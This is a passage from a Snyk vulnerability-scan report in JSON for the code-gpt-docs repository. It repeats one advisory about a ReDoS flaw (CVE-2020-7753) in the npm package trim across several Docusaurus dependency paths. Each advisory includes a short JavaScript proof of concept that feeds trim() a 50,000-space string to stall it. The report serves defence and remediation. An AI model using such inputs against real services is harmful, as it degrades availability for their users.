          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    }
  ],
  "numDependencies": 1050,
  "severityMap": {
    "critical": 0,
    "high": 117,
    "medium": 51,
    "low": 0
  },
  "org": "bruswei",
  "packageManager": "npm",
  "summary": "168 vulnerable dependency paths",
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 4,
  "hasUnknownVersions": false,
  "path": "https://github.com/davila7/code-gpt-docs.git"
}
